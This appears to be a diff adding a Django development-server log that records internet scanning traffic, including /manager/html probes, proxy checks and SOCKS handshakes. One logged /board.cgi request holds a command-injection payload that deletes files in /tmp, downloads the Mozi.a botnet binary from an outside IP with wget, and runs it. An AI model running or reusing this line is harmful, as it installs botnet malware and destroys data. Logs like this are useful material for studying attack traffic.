+WARNING|17/Mar/2021 02:10:43|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 400 62889
+ERROR|17/Mar/2021 02:58:05|exception|28341|139906403788544|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|17/Mar/2021 02:58:05|log|28341|139906403788544|Bad Request: /manager/html
+WARNING|17/Mar/2021 02:58:05|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 400 62889
+WARNING|17/Mar/2021 03:39:30|log|28341|139906403788544|Not Found: /board.cgi
+WARNING|17/Mar/2021 03:39:30|basehttp|28341|139906403788544|"GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://182.124.62.171:45400/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" 404 49810
+INFO|17/Mar/2021 04:27:09|basehttp|28341|139906403788544|"GET / HTTP/1.1" 200 44
+INFO|17/Mar/2021 05:17:36|basehttp|28341|139906403788544|"GET / HTTP/1.0" 200 75
+ERROR|17/Mar/2021 06:48:36|exception|28341|139906403788544|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|17/Mar/2021 06:48:36|log|28341|139906403788544|Bad Request: /manager/html
+WARNING|17/Mar/2021 06:48:36|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 400 62889
+INFO|17/Mar/2021 07:24:43|basehttp|28341|139906403788544|"GET / HTTP/1.1" 200 44
+ERROR|17/Mar/2021 08:33:25|exception|28341|139906403788544|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|17/Mar/2021 08:33:25|log|28341|139906403788544|Bad Request: /manager/html
+WARNING|17/Mar/2021 08:33:25|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 400 62889
+ERROR|17/Mar/2021 08:33:25|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 500 59
+ERROR|17/Mar/2021 08:34:18|exception|28341|139906403788544|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+WARNING|17/Mar/2021 08:34:18|log|28341|139906403788544|Bad Request: /manager/html
+WARNING|17/Mar/2021 08:34:18|basehttp|28341|139906403788544|"GET /manager/html HTTP/1.1" 400 62889
+WARNING|17/Mar/2021 09:40:16|log|28341|139906403788544|Not Found: /http:/www.bing.com/
+WARNING|17/Mar/2021 09:40:16|basehttp|28341|139906403788544|"GET http://www.bing.com/ HTTP/1.1" 404 1665
+INFO|17/Mar/2021 09:40:46|basehttp|28341|139906403788544|code 400, message Bad request syntax ('\x05\x01\x00')
+WARNING|17/Mar/2021 09:40:46|basehttp|28341|139906403788544|" " 400 -
+INFO|17/Mar/2021 09:40:56|basehttp|28341|139906490238720|code 400, message Bad request syntax ('\x04\x01\x00PÌOÅÈ\x00')
+WARNING|17/Mar/2021 09:40:56|basehttp|28341|139906490238720|" PÌOÅÈ " 400 -
+INFO|17/Mar/2021 09:43:16|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
+INFO|17/Mar/2021 10:40:58|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
+INFO|17/Mar/2021 10:40:58|basehttp|28341|139906490238720|"GET / HTTP/1.1" 200 44
